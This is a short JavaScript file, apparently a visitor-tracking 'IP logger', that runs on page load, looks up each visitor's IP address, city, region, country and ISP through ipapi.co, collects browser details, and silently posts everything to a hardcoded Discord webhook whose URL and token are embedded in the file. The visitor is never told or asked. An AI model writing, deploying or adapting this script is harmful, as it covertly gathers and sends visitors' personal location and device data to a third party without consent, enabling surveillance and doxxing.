// Replace this with your Discord Webhook URL
const webhookUrl = "https://discord.com/api/webhooks/1316077361971855380/ERP5-YLnLfes7x86AcrUlsWFQTApKLZFqdGHU_PcdCih5cF-jSeIOSDzycdivtMsDWmn";

// Function to send data to the webhook
async function sendToWebhook(data) {
    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `New visitor detected:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
            })
        });
    } catch (err) {
        console.error("Failed to send data to Discord Webhook:", err);
    }
}

// Function to get user's IP and location
async function getUserInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        const locationData = await response.json();
        
        // Collecting browser and device info
        const browserData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };

        // Combine all the data
        const userData = {
            ip: locationData.ip,
            city: locationData.city,
            region: locationData.region,
            country: locationData.country_name,
            isp: locationData.org,
            browser: browserData
        };

        // Send data to Discord Webhook
        sendToWebhook(userData);
    } catch (err) {
        console.error("Failed to fetch user info:", err);
    }
}

// Call the function when the page loads
window.onload = getUserInfo;
